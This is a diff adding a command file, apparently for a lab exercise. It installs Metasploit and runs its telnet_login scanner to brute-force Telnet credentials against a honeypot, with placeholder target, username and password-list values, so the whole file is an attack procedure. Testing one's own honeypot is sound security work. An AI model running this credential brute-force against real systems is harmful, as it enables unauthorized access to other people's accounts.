@@ -1,0 +1,52 @@
+#this file is for the metaslpoit attack on telnet honeypot
+
+# Update and upgrade system packages
+sudo apt update && sudo apt upgrade -y
+
+# Install required dependencies
+sudo apt install curl gpg -y
+
+# Add Metasploit's GPG key
+curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msf.gpg.key | gpg --dearmor -o /usr/share/keyrings/msf-keyring.gpg
+
+# Add the Metasploit repository
+echo "deb [signed-by=/usr/share/keyrings/msf-keyring.gpg] https://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid main" | sudo tee /etc/apt/sources.list.d/metasploit-framework.list
+
+# Update the package list
+sudo apt update
+
+# Install Metasploit Framework
+sudo apt install metasploit-framework -y
+
+# Verify installation
+msfconsole --version
+
+# Launch Metasploit
+msfconsole
+
+# Search for a Telnet attack module
+search telnet
+
+# Use the Telnet login scanner module
+use auxiliary/scanner/telnet/telnet_login
+
+# Set the target IP address
+set RHOSTS <target_ip>
+
+# Set the Telnet port (default is 23)
+set RPORT 23
+
+# Set the username to test
+set USERNAME <username>
+
+# Set a single password or a password file for brute force
+set PASSWORD <password>        # Single password
+# or
+set PASS_FILE /path/to/password_list.txt  # For a password list
+
+# (Optional) Set the number of threads for faster scanning
+set THREADS 10
+
+# Run the module to perform the attack
+run
+
